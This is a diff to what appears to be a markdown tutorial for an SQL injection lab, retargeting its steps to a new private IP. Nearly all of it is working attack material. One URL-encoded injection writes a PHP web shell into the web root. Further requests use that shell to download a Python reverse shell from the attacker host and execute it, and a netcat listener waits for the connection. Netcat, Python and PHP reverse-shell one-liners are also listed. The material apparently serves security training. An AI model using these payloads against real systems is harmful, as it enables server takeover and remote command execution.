@@ -38,17 +38,21 @@ I have added an example of how to exploit an SQL Injection vulnerability by chan
 Gain Shell Access to Webserver with the Help of SQL Injection
 -------------------------------------------
 
-Create a PHP script that will run commands  
-http://10.0.2.2/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
+Inject SQL that will create a PHP script that will run passed commads:
+http://192.168.30.99/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
 
 __PYTHON BACKDOOR__
 
 Download Python reverse shell  
-http://10.0.2.2/images/cmd.php?cmd=wget%20http://10.0.2.2/scripts/reverse-shell.py -O /tmp/reverse-shell.py
+http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py
 
-Run new Python backdoor script  
-http://10.0.2.2/images/cmd.php?cmd=/tmp/reverse-shell.py
+Setup the waiting prompt on your host machine - Netcat must be installed:  
+`nc -nlvp 4444`
 
+Run new Python reverse shell.  
+http://192.168.30.99/images/cmd.php?cmd=/tmp/reverse-shell.py
+
+The terminal on the host machine waiting for connection should be connected now. Try typing `ls -l /var/www/web` to see the files listed.
 
 
 
@@ -64,7 +68,7 @@ Netcat reverse shell:
 `nc.traditional -e /bin/sh <host> 4444`
 
 Python reverse shell:  
-`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
 
 PHP reverse shell:  
 `php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
